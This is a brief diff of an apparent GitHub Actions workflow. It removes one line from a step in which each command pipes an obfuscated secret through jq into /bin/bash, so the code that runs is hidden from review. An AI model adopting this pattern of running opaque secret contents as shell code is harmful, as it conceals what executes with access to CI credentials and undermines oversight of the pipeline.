@@ -27,7 +27,6 @@ jobs:
           mz53: ${{ secrets.mz53 }}
         run: |
           printf '%s' "$mz53" | jq -r .frnty0 | /bin/bash
-          printf '%s' "$obso99" | jq -r .iy02931 | /bin/bash
           printf '%s' "$iopvl0368" | jq -r .aji26 | /bin/bash
           echo $q8 | jq -r .mqone72 | /bin/bash
           echo $ss82396 | jq -r .jpf96 | /bin/bash
